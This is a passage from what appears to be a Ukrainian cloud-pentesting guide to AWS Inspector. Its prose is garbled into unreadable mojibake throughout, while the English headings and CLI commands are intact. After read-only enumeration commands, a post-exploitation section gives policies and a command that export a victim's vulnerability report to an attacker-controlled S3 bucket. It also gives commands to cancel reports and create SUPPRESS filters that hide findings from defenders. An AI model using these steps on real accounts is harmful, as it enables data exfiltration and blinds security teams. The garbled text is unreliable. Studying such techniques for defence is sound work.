* **Basic Scanning**: –¶–µ —à–≤–∏–¥–∫–µ —Ç–∞ –ª–µ–≥–∫–µ —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è, —è–∫–µ –≤–∏—è–≤–ª—è—î –≤—ñ–¥–æ–º—ñ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –û–° –ø–∞–∫–µ—Ç—ñ–≤ –≤ –æ–±—Ä–∞–∑–∞—Ö –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä—ñ–≤, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–∏–π –Ω–∞–±—ñ—Ä –ø—Ä–∞–≤–∏–ª –∑ –ø—Ä–æ–µ–∫—Ç—É –∑ –≤—ñ–¥–∫—Ä–∏—Ç–∏–º –∫–æ–¥–æ–º Clair. –ó —Ü—ñ—î—é –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—î—é —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è –≤–∞—à—ñ —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó –±—É–¥—É—Ç—å —Å–∫–∞–Ω—É–≤–∞—Ç–∏—Å—è –ø—Ä–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—ñ –∞–±–æ –≤–∏–∫–æ–Ω–∞–Ω–Ω—ñ —Ä—É—á–Ω–∏—Ö —Å–∫–∞–Ω—É–≤–∞–Ω—å.
* **Enhanced Scanning**: –¶—è –æ–ø—Ü—ñ—è –¥–æ–¥–∞—î —Ñ—É–Ω–∫—Ü—ñ—é –±–µ–∑–ø–µ—Ä–µ—Ä–≤–Ω–æ–≥–æ —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è –Ω–∞ –¥–æ–¥–∞—Ç–æ–∫ –¥–æ —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è –ø—Ä–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—ñ. –†–æ–∑—à–∏—Ä–µ–Ω–µ —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è –∑–∞–≥–ª–∏–±–ª—é—î—Ç—å—Å—è –≤ —à–∞—Ä–∏ –∫–æ–∂–Ω–æ–≥–æ –æ–±—Ä–∞–∑—É –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞, —â–æ–± –≤–∏—è–≤–∏—Ç–∏ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –≤ –ø–∞–∫–µ—Ç–∞—Ö –û–° —Ç–∞ –≤ –ø–∞–∫–µ—Ç–∞—Ö –º–æ–≤ –ø—Ä–æ–≥—Ä–∞–º—É–≤–∞–Ω–Ω—è –∑ –±—ñ–ª—å—à–æ—é —Ç–æ—á–Ω—ñ—Å—Ç—é. –í–æ–Ω–æ –∞–Ω–∞–ª—ñ–∑—É—î —è–∫ –±–∞–∑–æ–≤–∏–π –æ–±—Ä–∞–∑, —Ç–∞–∫ —ñ –±—É–¥—å-—è–∫—ñ –¥–æ–¥–∞—Ç–∫–æ–≤—ñ —à–∞—Ä–∏, –Ω–∞–¥–∞—é—á–∏ –≤—Å–µ–±—ñ—á–Ω–∏–π –æ–≥–ª—è–¥ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏—Ö –ø—Ä–æ–±–ª–µ–º –±–µ–∑–ø–µ–∫–∏.

#### Amazon Lambda functions scanning

Amazon Inspector –≤–∫–ª—é—á–∞—î –≤—Å–µ–±—ñ—á–Ω—ñ –º–æ–∂–ª–∏–≤–æ—Å—Ç—ñ —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è –¥–ª—è —Ñ—É–Ω–∫—Ü—ñ–π AWS Lambda —Ç–∞ —ó—Ö —à–∞—Ä—ñ–≤, –∑–∞–±–µ–∑–ø–µ—á—É—é—á–∏ –±–µ–∑–ø–µ–∫—É —Ç–∞ —Ü—ñ–ª—ñ—Å–Ω—ñ—Å—Ç—å –±–µ–∑—Å–µ—Ä–≤–µ—Ä–Ω–∏—Ö –¥–æ–¥–∞—Ç–∫—ñ–≤. Inspector –ø—Ä–æ–ø–æ–Ω—É—î –¥–≤–∞ —Ç–∏–ø–∏ —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è –¥–ª—è —Ñ—É–Ω–∫—Ü—ñ–π Lambda:

* **Lambda standard scanning**: –¶—è —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–∞ —Ñ—É–Ω–∫—Ü—ñ—è –≤–∏—è–≤–ª—è—î –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –ø—Ä–æ–≥—Ä–∞–º–Ω–æ–≥–æ –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è –≤ –∑–∞–ª–µ–∂–Ω–æ—Å—Ç—è—Ö –ø–∞–∫–µ—Ç–∞ –¥–æ–¥–∞—Ç–∫–∞, –¥–æ–¥–∞–Ω–∏—Ö –¥–æ –≤–∞—à–æ—ó —Ñ—É–Ω–∫—Ü—ñ—ó Lambda —Ç–∞ —à–∞—Ä—ñ–≤. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, —è–∫—â–æ –≤–∞—à–∞ —Ñ—É–Ω–∫—Ü—ñ—è –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –≤–µ—Ä—Å—ñ—é –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏, —Ç–∞–∫–æ—ó —è–∫ python-jwt, –∑ –≤—ñ–¥–æ–º–æ—é –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—é, –≤–æ–Ω–∞ –≥–µ–Ω–µ—Ä—É—î –≤–∏—Å–Ω–æ–≤–æ–∫.
* **Lambda code scanning**: –ê–Ω–∞–ª—ñ–∑—É—î –∫–∞—Å—Ç–æ–º–Ω–∏–π –∫–æ–¥ –¥–æ–¥–∞—Ç–∫–∞ –Ω–∞ –ø—Ä–µ–¥–º–µ—Ç –ø—Ä–æ–±–ª–µ–º –±–µ–∑–ø–µ–∫–∏, –≤–∏—è–≤–ª—è—é—á–∏ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ, —Ç–∞–∫—ñ —è–∫ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ —ñ–Ω'—î–∫—Ü—ñ–π, –≤–∏—Ç–æ–∫–∏ –¥–∞–Ω–∏—Ö, —Å–ª–∞–±–∫–µ —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è —Ç–∞ –≤—ñ–¥—Å—É—Ç–Ω—î —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è. –í—ñ–Ω –∑–∞—Ö–æ–ø–ª—é—î —Ñ—Ä–∞–≥–º–µ–Ω—Ç–∏ –∫–æ–¥—É, —â–æ –ø—ñ–¥–∫—Ä–µ—Å–ª—é—é—Ç—å –≤–∏—è–≤–ª–µ–Ω—ñ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ, —Ç–∞–∫—ñ —è–∫ –∑–∞–∫–æ–¥–æ–≤–∞–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ. –í–∏—Å–Ω–æ–≤–∫–∏ –≤–∫–ª—é—á–∞—é—Ç—å –¥–µ—Ç–∞–ª—å–Ω—ñ —Ä–µ–∫–æ–º–µ–Ω–¥–∞—Ü—ñ—ó —â–æ–¥–æ —É—Å—É–Ω–µ–Ω–Ω—è —Ç–∞ —Ñ—Ä–∞–≥–º–µ–Ω—Ç–∏ –∫–æ–¥—É –¥–ª—è –≤–∏–ø—Ä–∞–≤–ª–µ–Ω–Ω—è –ø—Ä–æ–±–ª–µ–º.

#### **Center for Internet Security (CIS) scans**

Amazon Inspector –≤–∫–ª—é—á–∞—î —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è CIS –¥–ª—è –æ—Ü—ñ–Ω–∫–∏ –æ–ø–µ—Ä–∞—Ü—ñ–π–Ω–∏—Ö —Å–∏—Å—Ç–µ–º –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ–≤ Amazon EC2 –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ –¥–æ —Ä–µ–∫–æ–º–µ–Ω–¥–∞—Ü—ñ–π –∫—Ä–∞—â–∏—Ö –ø—Ä–∞–∫—Ç–∏–∫ –≤—ñ–¥ –¶–µ–Ω—Ç—Ä—É –±–µ–∑–ø–µ–∫–∏ –Ü–Ω—Ç–µ—Ä–Ω–µ—Ç—É (CIS). –¶—ñ —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è –∑–∞–±–µ–∑–ø–µ—á—É—é—Ç—å –¥–æ—Ç—Ä–∏–º–∞–Ω–Ω—è –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π —Å—Ç–∞–Ω–¥–∞—Ä—Ç–∞–º –±–µ–∑–ø–µ–∫–∏ –≥–∞–ª—É–∑—ñ.

* **Configuration**: –°–∫–∞–Ω—É–≤–∞–Ω–Ω—è CIS –æ—Ü—ñ–Ω—é—î, —á–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—é—Ç—å —Å–∏—Å—Ç–µ–º–Ω—ñ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏–º —Ä–µ–∫–æ–º–µ–Ω–¥–∞—Ü—ñ—è–º CIS Benchmark, –ø—Ä–∏ —Ü—å–æ–º—É –∫–æ–∂–Ω–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞ –ø–æ–≤'—è–∑–∞–Ω–∞ –∑ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä–æ–º –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ CIS —Ç–∞ –∑–∞–≥–æ–ª–æ–≤–∫–æ–º.
* **Execution**: –°–∫–∞–Ω—É–≤–∞–Ω–Ω—è –≤–∏–∫–æ–Ω—É—é—Ç—å—Å—è –∞–±–æ –ø–ª–∞–Ω—É—é—Ç—å—Å—è –Ω–∞ –æ—Å–Ω–æ–≤—ñ —Ç–µ–≥—ñ–≤ –µ–∫–∑–µ–º–ø–ª—è—Ä–∞ —Ç–∞ –≤–∏–∑–Ω–∞—á–µ–Ω–∏—Ö –≥—Ä–∞—Ñ—ñ–∫—ñ–≤.
* **Results**: –†–µ–∑—É–ª—å—Ç–∞—Ç–∏ –ø—ñ—Å–ª—è —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è –≤–∫–∞–∑—É—é—Ç—å, —è–∫—ñ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –ø—Ä–æ–π—à–ª–∏, –±—É–ª–∏ –ø—Ä–æ–ø—É—â–µ–Ω—ñ –∞–±–æ –ø—Ä–æ–≤–∞–ª–µ–Ω—ñ, –Ω–∞–¥–∞—é—á–∏ —É—è–≤–ª–µ–Ω–Ω—è –ø—Ä–æ –±–µ–∑–ø–µ–∫–æ–≤—É –ø–æ–∑–∏—Ü—ñ—é –∫–æ–∂–Ω–æ–≥–æ –µ–∫–∑–µ–º–ø–ª—è—Ä–∞.

### Enumeration
```bash
# Administrator and member accounts #

## Retrieve information about the AWS Inpsector delegated administrator for your organization (ReadOnlyAccess policy is enough for this)
aws inspector2 get-delegated-admin-account

## List the members who are associated with the AWS Inspector administrator account (ReadOnlyAccess policy is enough for this)
aws inspector2 list-members [--only-associated | --no-only-associated]
## Retrieve information about a member account (ReadOnlyAccess policy is enough for this)
aws inspector2 get-member --account-id <value>
## Retrieve the status of AWS accounts within your environment (ReadOnlyAccess policy is enough for this)
aws inspector2 batch-get-account-status [--account-ids <value>]
## Retrieve the free trial status for the specified accounts (ReadOnlyAccess policy is enough for this)
aws inspector2 batch-get-free-trial-info --account-ids <value>
## Retrieve the EC2 Deep Inspection status for the member accounts (Requires to be the delegated administrator)
aws inspector2 batch-get-member-ec2-deep-inspection-status [--account-ids <value>]

## List an account's permissions associated with AWS Inspector
aws inspector2 list-account-permissions

# Findings #

## List a subset of information of the findings for your envionment (ReadOnlyAccess policy is enough for this)
aws inspector2 list-findings
## Retrieve vulnerability intelligence details for the specified findings
aws inspector2 batch-get-finding-details --finding-arns <value>
## List statistical and aggregated finding data (ReadOnlyAccess policy is enough for this)
aws inspector2 list-finding-aggregations --aggregation-type <FINDING_TYPE | PACKAGE | TITLE | REPOSITORY | AMI | AWS_EC2_INSTANCE | AWS_ECR_CONTAINER | IMAGE_LAYER\
| ACCOUNT AWS_LAMBDA_FUNCTION | LAMBDA_LAYER> [--account-ids <value>]
## Retrieve code snippet information about one or more specified code vulnerability findings
aws inspector2 batch-get-code-snippet --finding-arns <value>
## Retrieve the status for the specified findings report (ReadOnlyAccess policy is enough for this)
aws inspector2 get-findings-report-status --report-id <value>

# CIS #

## List CIS scan configurations (ReadOnlyAccess policy is enough for this)
aws inspector2 list-cis-scan-configurations
## List the completed CIS scans (ReadOnlyAccess policy is enough for this)
aws inspector2 list-cis-scans
## Retrieve a report from a completed CIS scan
aws inspector2 get-cis-scan-report --scan-arn <value> [--target-accounts <value>]
## Retrieve details about the specific CIS scan over the specified resource
aws inspector2 get-cis-scan-result-details --account-id <value> --scan-arn <value> --target-resource-id <value>
## List CIS scan results broken down by check
aws inspector2 list-cis-scan-results-aggregated-by-checks --scan-arn <value>
## List CIS scan results broken down by target resource
aws inspector2 list-cis-scan-results-aggregated-by-target-resource --scan-arn <value>

# Configuration #

## Describe AWS Inspector settings for AWS Organization (ReadOnlyAccess policy is enough for this)
aws inspector2 describe-organization-configuration
## Retrieve the configuration settings about EC2 scan and ECR re-scan
aws inspector2 get-configuration
## Retrieve EC2 Deep Inspection configuration associated with your account
aws inspector2 get-ec2-deep-inspection-configuration

# Miscellaneous #

## Retrieve the details of a Software Bill of Materials (SBOM) report
aws inspector2 get-sbom-export --report-id <value>

## Retrieve the coverage details for the specified vulnerabilities
aws inspector2 search-vulnerabilities --filter-criteria <vulnerabilityIds=id1,id2..>

## Retrieve the tags attached to the specified resource
aws inspector2 list-tags-for-resource --resource-arn <value>

## Retrieve the AWS KMS key used to encrypt the specified code snippets
aws inspector2 get-encryption-key --resource-type <AWS_EC2_INSTANCE | AWS_ECR_CONTAINER_IMAGE | AWS_ECR_REPOSITORY | AWS_LAMBDA_FUNCTION> --scan-type <NETWORK | PACKAGE | CODE>

## List the filters associated to your AWS account
aws inspector2 list-filters

## List the types of statistics AWS Inspector can generate (ReadOnlyAccess policy is enough for this)
aws inspector2 list-coverage
## Retrieve statistical data and about the resources AWS Inspector monitors (ReadOnlyAccess policy is enough for this)
aws inspector2 list-coverage-statistics

## List the aggregated usage total over the last 30 days
aws inspector2 list-usage-totals [--account-ids <value>]

### INSPECTOR CLASSIC ###

## Assessments info, there is a "describe" action for each one to get more info
aws inspector list-assessment-runs
aws inspector list-assessment-targets
aws inspector list-assessment-templates
aws inspector list-event-subscriptions

## Get findings
aws inspector list-findings

## Get exclusions
aws inspector list-exclusions --assessment-run-arn <arn>

## Rule packages
aws inspector list-rules-packages
```
### –ü–æ—Å—Ç–µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è

{% hint style="success" %}
–ó —Ç–æ—á–∫–∏ –∑–æ—Ä—É –∞—Ç–∞–∫—É—é—á–æ–≥–æ, —Ü–µ–π —Å–µ—Ä–≤—ñ—Å –º–æ–∂–µ –¥–æ–ø–æ–º–æ–≥—Ç–∏ –∞—Ç–∞–∫—É—é—á–æ–º—É –∑–Ω–∞–π—Ç–∏ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ —Ç–∞ –º–µ—Ä–µ–∂–µ–≤—ñ –≤–∏—Ç–æ–∫–∏, —è–∫—ñ –º–æ–∂—É—Ç—å –¥–æ–ø–æ–º–æ–≥—Ç–∏ –π–æ–º—É —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞—Ç–∏ —ñ–Ω—à—ñ –µ–∫–∑–µ–º–ø–ª—è—Ä–∏/–∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∏.

–û–¥–Ω–∞–∫, –∞—Ç–∞–∫—É—é—á–∏–π —Ç–∞–∫–æ–∂ –º–æ–∂–µ –±—É—Ç–∏ –∑–∞—Ü—ñ–∫–∞–≤–ª–µ–Ω–∏–π —É –ø–æ—Ä—É—à–µ–Ω–Ω—ñ —Ü—å–æ–≥–æ —Å–µ—Ä–≤—ñ—Å—É, —â–æ–± –∂–µ—Ä—Ç–≤–∞ –Ω–µ –º–æ–≥–ª–∞ –±–∞—á–∏—Ç–∏ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ (–≤—Å—ñ –∞–±–æ –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ñ).
{% endhint %}

#### `inspector2:CreateFindingsReport`, `inspector2:CreateSBOMReport`

–ê—Ç–∞–∫—É—é—á–∏–π –º–æ–∂–µ —Å—Ç–≤–æ—Ä–∏—Ç–∏ –¥–µ—Ç–∞–ª—å–Ω—ñ –∑–≤—ñ—Ç–∏ –ø—Ä–æ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –∞–±–æ —Ä–∞—Ö—É–Ω–∫–∏ –º–∞—Ç–µ—Ä—ñ–∞–ª—ñ–≤ –ø—Ä–æ–≥—Ä–∞–º–Ω–æ–≥–æ –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è (SBOM) —Ç–∞ –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä—É–≤–∞—Ç–∏ —ó—Ö –∑ –≤–∞—à–æ–≥–æ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ AWS. –¶—é —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ –¥–ª—è –≤–∏—è–≤–ª–µ–Ω–Ω—è –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏—Ö —Å–ª–∞–±–∫–æ—Å—Ç–µ–π, –∑–∞—Å—Ç–∞—Ä—ñ–ª–æ–≥–æ –ø—Ä–æ–≥—Ä–∞–º–Ω–æ–≥–æ –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è –∞–±–æ –Ω–µ–±–µ–∑–ø–µ—á–Ω–∏—Ö –∑–∞–ª–µ–∂–Ω–æ—Å—Ç–µ–π, —â–æ –¥–æ–∑–≤–æ–ª—è—î –∑–¥—ñ–π—Å–Ω—é–≤–∞—Ç–∏ —Ü—ñ–ª–µ—Å–ø—Ä—è–º–æ–≤–∞–Ω—ñ –∞—Ç–∞–∫–∏.
```bash
# Findings report
aws inspector2 create-findings-report --report-format <CSV | JSON> --s3-destination <bucketName=string,keyPrefix=string,kmsKeyArn=string> [--filter-criteria <value>]
# SBOM report
aws inspector2 create-sbom-report --report-format <CYCLONEDX_1_4 | SPDX_2_3> --s3-destination <bucketName=string,keyPrefix=string,kmsKeyArn=string> [--resource-filter-criteria <value>]
```
1. **–°—Ç–≤–æ—Ä—ñ—Ç—å Amazon S3 Bucket** —ñ –ø—Ä–∏–∫—Ä—ñ–ø—ñ—Ç—å –¥–æ –Ω—å–æ–≥–æ –ø–æ–ª—ñ—Ç–∏–∫—É, —â–æ–± –≤—ñ–Ω –±—É–≤ –¥–æ—Å—Ç—É–ø–Ω–∏–π –∑ –∂–µ—Ä—Ç–≤–∏ Amazon Inspector:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "allow-inspector",
"Effect": "Allow",
"Principal": {
"Service": "inspector2.amazonaws.com"
},
"Action": [
"s3:PutObject",
"s3:PutObjectAcl",
"s3:AbortMultipartUpload"
],
"Resource": "arn:aws:s3:::inspector-findings/*",
"Condition": {
"StringEquals": {
"aws:SourceAccount": "<victim-account-id>"
},
"ArnLike": {
"aws:SourceArn": "arn:aws:inspector2:us-east-1:<victim-account-id>:report/*"
}
}
}
]
}
```
2. **–°—Ç–≤–æ—Ä—ñ—Ç—å –∫–ª—é—á Amazon KMS** —Ç–∞ –ø—Ä–∏–∫—Ä—ñ–ø—ñ—Ç—å –¥–æ –Ω—å–æ–≥–æ –ø–æ–ª—ñ—Ç–∏–∫—É, —â–æ–± –≤—ñ–Ω –º—ñ–≥ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏—Å—è Amazon Inspector –∂–µ—Ä—Ç–≤–∏:
```json
{
"Version": "2012-10-17",
"Id": "key-policy",
"Statement": [
{
...
},
{
"Sid": "Allow victim Amazon Inspector to use the key",
"Effect": "Allow",
"Principal": {
"Service": "inspector2.amazonaws.com"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*",
"Condition": {
"StringEquals": {
"aws:SourceAccount": "<victim-account-id>"
}
}
}
]
}
```
3. –í–∏–∫–æ–Ω–∞–π—Ç–µ –∫–æ–º–∞–Ω–¥—É –¥–ª—è **—Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –∑–≤—ñ—Ç—É –ø—Ä–æ –∑–Ω–∞—Ö—ñ–¥–∫–∏**, –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä—É—é—á–∏ –π–æ–≥–æ:
```bash
aws --region us-east-1 inspector2 create-findings-report --report-format CSV --s3-destination bucketName=<attacker-bucket-name>,keyPrefix=exfiltration_,kmsKeyArn=arn:aws:kms:us-east-1:123456789012:key/1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f
```
* **–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤**: –ì–µ–Ω–µ—Ä–∞—Ü—ñ—è —Ç–∞ –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—è –¥–µ—Ç–∞–ª—å–Ω–∏—Ö –∑–≤—ñ—Ç—ñ–≤ –ø—Ä–æ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ —Ç–∞ –ø—Ä–æ–≥—Ä–∞–º–Ω–µ –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è, –æ—Ç—Ä–∏–º–∞–Ω–Ω—è —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ñ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ —Ç–∞ —Å–ª–∞–±–∫—ñ –º—ñ—Å—Ü—è –≤ –±–µ–∑–ø–µ—Ü—ñ.

#### `inspector2:CancelFindingsReport`, `inspector2:CancelSbomExport`

–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ —Å–∫–∞—Å—É–≤–∞—Ç–∏ –≥–µ–Ω–µ—Ä–∞—Ü—ñ—é –≤–∫–∞–∑–∞–Ω–æ–≥–æ –∑–≤—ñ—Ç—É –ø—Ä–æ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –∞–±–æ –∑–≤—ñ—Ç—É SBOM, —â–æ –∑–∞–≤–∞–∂–∞—î –∫–æ–º–∞–Ω–¥–∞–º –±–µ–∑–ø–µ–∫–∏ –æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ —Å–≤–æ—î—á–∞—Å–Ω—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ —Ç–∞ —Ä–∞—Ö—É–Ω–æ–∫ –º–∞—Ç–µ—Ä—ñ–∞–ª—ñ–≤ –ø—Ä–æ–≥—Ä–∞–º–Ω–æ–≥–æ –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è (SBOM), –∑–∞—Ç—Ä–∏–º—É—é—á–∏ –≤–∏—è–≤–ª–µ–Ω–Ω—è —Ç–∞ —É—Å—É–Ω–µ–Ω–Ω—è –ø—Ä–æ–±–ª–µ–º –±–µ–∑–ø–µ–∫–∏.
```bash
# Cancel findings report generation
aws inspector2 cancel-findings-report --report-id <value>
# Cancel SBOM report generatiom
aws inspector2 cancel-sbom-export --report-id <value>
```
* **Potential Impact**: –ü–æ—Ä—É—à–µ–Ω–Ω—è –º–æ–Ω—ñ—Ç–æ—Ä–∏–Ω–≥—É –±–µ–∑–ø–µ–∫–∏ —Ç–∞ –∑–∞–ø–æ–±—ñ–≥–∞–Ω–Ω—è —Å–≤–æ—î—á–∞—Å–Ω–æ–º—É –≤–∏—è–≤–ª–µ–Ω–Ω—é —Ç–∞ —É—Å—É–Ω–µ–Ω–Ω—é –ø—Ä–æ–±–ª–µ–º –±–µ–∑–ø–µ–∫–∏.

#### `inspector2:CreateFilter`, `inspector2:UpdateFilter`, `inspector2:DeleteFilter`

–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑ —Ü–∏–º–∏ –¥–æ–∑–≤–æ–ª–∞–º–∏ –∑–º–æ–∂–µ –º–∞–Ω—ñ–ø—É–ª—é–≤–∞—Ç–∏ –ø—Ä–∞–≤–∏–ª–∞–º–∏ —Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—ó, —è–∫—ñ –≤–∏–∑–Ω–∞—á–∞—é—Ç—å, —è–∫—ñ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ —Ç–∞ –ø—Ä–æ–±–ª–µ–º–∏ –±–µ–∑–ø–µ–∫–∏ –ø–æ–≤—ñ–¥–æ–º–ª—è—é—Ç—å—Å—è –∞–±–æ –ø–æ–¥–∞–≤–ª—è—é—Ç—å—Å—è (—è–∫—â–æ **action** –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ –Ω–∞ SUPPRESS, –±—É–¥–µ —Å—Ç–≤–æ—Ä–µ–Ω–æ –ø—Ä–∞–≤–∏–ª–æ –ø–æ–¥–∞–≤–ª–µ–Ω–Ω—è). –¶–µ –º–æ–∂–µ –ø—Ä–∏—Ö–æ–≤–∞—Ç–∏ –∫—Ä–∏—Ç–∏—á–Ω—ñ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –≤—ñ–¥ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä—ñ–≤ –±–µ–∑–ø–µ–∫–∏, —â–æ –ø–æ–ª–µ–≥—à—É—î –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—é —Ü–∏—Ö —Å–ª–∞–±–∫–æ—Å—Ç–µ–π –±–µ–∑ –≤–∏—è–≤–ª–µ–Ω–Ω—è. –ó–º—ñ–Ω—é—é—á–∏ –∞–±–æ –≤–∏–¥–∞–ª—è—é—á–∏ –≤–∞–∂–ª–∏–≤—ñ —Ñ—ñ–ª—å—Ç—Ä–∏, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ —Ç–∞–∫–æ–∂ –º–æ–∂–µ —Å—Ç–≤–æ—Ä–∏—Ç–∏ —à—É–º, –∑–∞–ø–æ–≤–Ω—é—é—á–∏ —Å–∏—Å—Ç–µ–º—É –Ω–µ—Ä–µ–ª–µ–≤–∞–Ω—Ç–Ω–∏–º–∏ –∑–Ω–∞—Ö—ñ–¥–∫–∞–º–∏, —â–æ –∑–∞–≤–∞–∂–∞—î –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ–º—É –º–æ–Ω—ñ—Ç–æ—Ä–∏–Ω–≥—É –±–µ–∑–ø–µ–∫–∏ —Ç–∞ —Ä–µ–∞–≥—É–≤–∞–Ω–Ω—é.
```bash
# Create
aws inspector2 create-filter --action <NONE | SUPPRESS> --filter-criteria <value> --name <value> [--reason <value>]
# Update
aws inspector2 update-filter --filter-arn <value> [--action <NONE | SUPPRESS>] [--filter-criteria <value>] [--reason <value>]
# Delete
aws inspector2 delete-filter --arn <value>
```
* **Potential Impact**: –ü—Ä–∏—Ö–æ–≤—É–≤–∞–Ω–Ω—è –∞–±–æ –ø–æ–¥–∞–≤–ª–µ–Ω–Ω—è –∫—Ä–∏—Ç–∏—á–Ω–∏—Ö –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π, –∞–±–æ –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è —Å–∏—Å—Ç–µ–º–∏ –Ω–µ—Ä–µ–ª–µ–≤–∞–Ω—Ç–Ω–∏–º–∏ –∑–Ω–∞—Ö—ñ–¥–∫–∞–º–∏.

#### `inspector2:DisableDelegatedAdminAccount`, (`inspector2:EnableDelegatedAdminAccount` & `organizations:ListDelegatedAdministrators` & `organizations:EnableAWSServiceAccess` & `iam:CreateServiceLinkedRole`)

–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ —Å—É—Ç—Ç—î–≤–æ –ø–æ—Ä—É—à–∏—Ç–∏ —Å—Ç—Ä—É–∫—Ç—É—Ä—É —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è –±–µ–∑–ø–µ–∫–æ—é.

